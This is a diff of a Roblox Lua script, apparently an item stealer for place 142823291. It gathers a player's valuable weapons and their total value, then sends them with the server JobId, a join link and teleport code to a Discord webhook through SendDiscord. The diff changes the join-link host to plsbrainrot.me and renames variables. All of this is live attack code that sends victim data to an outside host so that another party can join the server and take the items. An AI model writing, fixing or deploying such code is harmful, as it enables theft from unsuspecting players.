@@ -198,9 +198,9 @@ local function SendDiscord(data)
     return false
 end
 
-local jobId = game.JobId
-local joinLink = "https://scriptssm.vercel.app/joiner.html?placeId=142823291&gameInstanceId=" .. jobId
-local teleportCode = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. jobId .. '")'
+local JobId = game.JobId
+local JoinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId
+local TeleportCode = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. JobId .. '")'
 
 local itemList = ""
 for _, it in ipairs(weaponsToSend) do
@@ -222,10 +222,10 @@ local sent = SendDiscord({
             {name = "Total Value", value = "```" .. totalValue .. "```", inline = true},
             {name = "Items Found", value = "```" .. #weaponsToSend .. "```", inline = true},
             {name = "Inventory", value = "```" .. itemList .. "```", inline = false},
-            {name = "Join Link", value = joinLink, inline = false},
-            {name = "Teleport Code", value = "```lua\n" .. teleportCode .. "\n```", inline = false}
+            {name = "Join Link", value = "[" .. string.sub(JobId, 1, 8) .. "...](" .. JoinLink .. ")", inline = false},
+            {name = "Teleport Code", value = "```lua\n" .. TeleportCode .. "\n```", inline = false}
         },
-        footer = {text = "Job ID: " .. jobId},
+        footer = {text = "Job ID: " .. JobId},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 })
